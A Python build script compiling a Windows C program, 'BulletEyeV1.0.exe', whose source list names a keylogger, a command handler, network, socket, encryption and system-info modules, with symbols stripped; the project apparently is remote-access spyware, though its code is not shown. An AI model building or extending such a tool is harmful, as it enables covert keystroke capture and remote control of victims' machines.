import hashlib
import json
import os
import subprocess
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# ================================================================
# ⚙️ CONFIGURATION
# ================================================================
PROJECT_NAME = "BulletEyeV1.0.exe"
CC = "gcc"   # 🖥️ Only C compiler
CFLAGS = ["-std=c99", "-DUNICODE", "-D_UNICODE", "-municode", "-s", "-O2"]

INCLUDE_DIRS = [
    "include",
    "."
]
LIB_DIRS = ["."]
LIBS = [
    "wininet", "ws2_32", "bcrypt", "advapi32", "ole32",
    "oleaut32", "bcrypt", "cabinet", "shlwapi", "shell32",
    "user32", "msvcrt", "wbemuuid"
]

SRC_FILES = [
    "src/main.c",
    "src/debug_print.c",
    "src/requests.c",
    "src/socket_init.c",
    "src/system_info.c",
    "src/cJSON.c",
    "src/command_handler.c",
    "src/helpers/utils.c",
    "src/helpers/keylogger.c",
    "src/service/compression_service.c",
    "src/service/encryption_service.c",
    "src/service/network_service.c",
    "res/resource.rc"
]

BUILD_DIR = Path("build")
OBJ_DIR = BUILD_DIR / "obj"
HASH_FILE = BUILD_DIR / "file_hashes.json"

# Global lock for safe console output
print_lock = threading.Lock()

# ================================================================
# 🔑 HELPERS
# ================================================================
def sha256sum(filename: Path) -> str:
    h = hashlib.sha256()
    with open(filename, "rb") as f:
        while chunk := f.read(8192):
            h.update(chunk)
    return h.hexdigest()

def run_cmd(cmd):
    res = subprocess.run(cmd)
    if res.returncode != 0:
        sys.exit(res.returncode)

def log(msg):
    """Thread-safe print"""
    with print_lock:
        print(msg, flush=True)

def compile_source(src, old_hashes, new_hashes):
    src_path = Path(src)
    obj_name = src_path.with_suffix(".obj").name
    obj_path = OBJ_DIR / obj_name

    if not src_path.exists():
        log(f"⚠️ Warning: {src} not found, skipping")
        return None

    h = sha256sum(src_path)
    new_hashes[str(src_path)] = h
    needs_build = (old_hashes.get(str(src_path)) != h) or (not obj_path.exists())

    if not needs_build:
        log(f"⏭️ [SKIP] {src} unchanged")
        return str(obj_path)

    log(f"🔨 [BUILD] {src}")

    if src.endswith(".rc"):
        cmd = ["windres", str(src_path).replace("\\", "/"), str(obj_path)]
        run_cmd(cmd)
        return str(obj_path)
    else:
        cmd = [CC, *CFLAGS]

    for inc in INCLUDE_DIRS:
        cmd.append(f"-I{inc}")

    cmd += ["-c", str(src_path), "-o", str(obj_path)]
    run_cmd(cmd)
    return str(obj_path)

# ================================================================
# 🚀 MAIN BUILD LOGIC
# ================================================================
def main():
    BUILD_DIR.mkdir(exist_ok=True)
    OBJ_DIR.mkdir(exist_ok=True)

    # 📂 Load previous hashes
    if HASH_FILE.exists():
        with open(HASH_FILE, "r") as f:
            old_hashes = json.load(f)
    else:
        old_hashes = {}

    new_hashes = {}
    obj_files = []

    # 🧵 Parallel compile
    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        futures = {
            executor.submit(compile_source, src, old_hashes, new_hashes): src
            for src in SRC_FILES
        }
        for future in as_completed(futures):
            obj = future.result()
            if obj:
                obj_files.append(obj)

    # 🔗 Link step
    log("🔗 [LINK] Linking executable")
    exe_path = BUILD_DIR / PROJECT_NAME
    cmd = [CC, "-municode", "-s", "-DCJSON_HIDE_SYMBOLS", "-o", str(exe_path)]
    cmd += obj_files
    for libdir in LIB_DIRS:
        cmd.append(f"-L{libdir}")
    for lib in LIBS:
        cmd.append(f"-l{lib}")
    run_cmd(cmd)

    # 🔒 Show SHA256 of final executable
    if exe_path.exists():
        exe_hash = sha256sum(exe_path)
        log(f"🔑 SHA256 of {PROJECT_NAME}: {exe_hash}")
    
    # 💾 Save hashes
    with open(HASH_FILE, "w") as f:
        json.dump(new_hashes, f, indent=2)

    log(f"✅ Build finished: {exe_path}")


if __name__ == "__main__":
    main()
